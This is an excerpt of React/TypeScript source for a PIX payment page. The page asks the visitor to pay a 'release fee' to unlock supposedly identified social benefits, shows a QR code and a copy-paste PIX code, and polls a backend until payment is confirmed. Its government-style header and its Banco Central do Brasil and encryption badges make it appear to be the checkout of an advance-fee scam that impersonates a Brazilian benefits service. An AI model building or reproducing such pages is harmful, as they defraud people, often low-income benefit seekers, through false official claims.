...
const PixPaymentScreen = ({ nome, cpf, valor, pixCopiaCola, transactionId, onBack, onPaid, onTabChange }: PixPaymentScreenProps) => {
  ...
  useEffect(() => {
    ...
    const checkStatus = async () => {
      try {
        const res = await supabase.functions.invoke("api-proxy", { body: { endpoint: "/status-venda", transactionId } });
        if (res.data?.success && res.data?.status === "PAID") { if (pollingRef.current) clearInterval(pollingRef.current); onPaid(); }
  ...
  const handleCopy = async () => {
    try { await navigator.clipboard.writeText(pixCopiaCola); } catch {
      const textarea = document.createElement("textarea"); textarea.value = pixCopiaCola;
    ...
    <div className="min-h-screen bg-background flex flex-col">
        ...
        <div className="mx-auto max-w-3xl px-4 flex items-center justify-between">
          <div className="flex items-center gap-1.5">
            ...
            <span className="text-[11px] sm:text-xs font-bold text-primary-foreground tracking-wide">
              Pagamento via PIX — Taxa de Liberação
            </span>
          </div>
      ...
      <div className="mx-auto max-w-lg w-full px-4 py-5 sm:py-8 animate-fade-in-up flex-1">
        <div className="text-center mb-3 sm:mb-5">
          ...
          <h1 className="text-base sm:text-lg font-bold text-foreground">Guia Gerada com Sucesso</h1>
          <p className="text-[10px] sm:text-xs text-muted-foreground mt-0.5">Efetue o pagamento para liberar seus benefícios</p>
        </div>

        <div className="rounded-xl border border-border bg-card shadow-sm overflow-hidden">
          <div className="gov-header p-3.5 sm:p-5 text-center">
            <p className="text-[8px] sm:text-[9px] text-white/40 uppercase tracking-wider mb-0.5">Valor da Taxa de Liberação</p>
          ...
          <div className="p-3.5 sm:p-5 space-y-3 sm:space-y-4">
            <div className="text-center">
              ...
              <div className="inline-flex rounded-xl border border-primary/15 bg-white p-3 sm:p-4 shadow-sm">
                <QRCodeSVG value={pixCopiaCola} size={160} level="M" includeMargin={false} bgColor="#ffffff" fgColor="#1a1a2e" className="w-[140px] h-[140px] sm:w-[200px] sm:h-[200px]" />
              </div>
            </div>
            ...
            <div>
              <p className="text-[9px] sm:text-[10px] font-semibold text-muted-foreground uppercase tracking-wider mb-1.5">PIX Copia e Cola</p>
              <div className="rounded-lg border border-dashed border-primary/20 bg-primary/5 p-2.5 sm:p-3 max-h-20 overflow-y-auto">
                <p className="text-[9px] sm:text-[10px] text-foreground font-mono break-all leading-relaxed select-all">{pixCopiaCola}</p>
              </div>
            </div>

            <button onClick={handleCopy} className={`w-full rounded-xl py-3 sm:py-3.5 text-xs sm:text-sm font-bold transition-all flex items-center justify-center gap-2 shadow-md active:scale-[0.98] ${copied ? "bg-accent text-accent-foreground" : "gradient-accent text-accent-foreground hover:opacity-90"}`}>
              {copied ? (<><CheckCircle className="h-3.5 w-3.5 sm:h-4 sm:w-4" />CÓDIGO COPIADO</>) : (<><Copy className="h-3.5 w-3.5 sm:h-4 sm:w-4" />COPIAR CÓDIGO PIX</>)}
            </button>
          </div>
          ...
          <div className="mx-3.5 sm:mx-5 mb-3 sm:mb-4">
            <div className="rounded-lg border border-border bg-muted/30 p-2.5 sm:p-3">
              ...
              <ol className="space-y-1 sm:space-y-1.5 text-[10px] sm:text-[11px] text-muted-foreground">
                {["Abra o aplicativo do seu banco", <>Selecione a opção <strong className="text-foreground">Pagar com PIX</strong></>, "Escaneie o QR Code ou cole o código copiado", "Confirme o pagamento"].map((text, i) => (
          ...
          <div className="mx-3.5 sm:mx-5 mb-3 sm:mb-4">
            <div className="rounded-lg border border-border bg-muted/30 p-2.5 sm:p-3">
              ...
              <p className="text-[8px] sm:text-[9px] text-muted-foreground leading-relaxed">
                O pagamento da taxa é necessário para a liberação dos benefícios sociais identificados. Após a confirmação, os valores serão creditados em até 48 horas úteis.
              </p>
            </div>
          </div>
          ...
          <div className="px-3.5 sm:px-5 pb-3.5 sm:pb-5">
            <div className="rounded-lg bg-muted/30 border border-border p-2 sm:p-2.5 flex items-center justify-center gap-3 sm:gap-4 text-[8px] sm:text-[9px] text-muted-foreground flex-wrap">
              <div className="flex items-center gap-1"><Landmark className="h-2.5 w-2.5 text-accent" /><span>Banco Central do Brasil</span></div>
              <span>•</span>
              <div className="flex items-center gap-1"><Shield className="h-2.5 w-2.5 text-accent" /><span>Criptografia AES-256</span></div>
              <span className="hidden sm:inline">•</span>
              <div className="hidden sm:flex items-center gap-1"><Lock className="h-2.5 w-2.5 text-accent" /><span>SSL/TLS 1.3</span></div>
            </div>
          </div>
        </div>
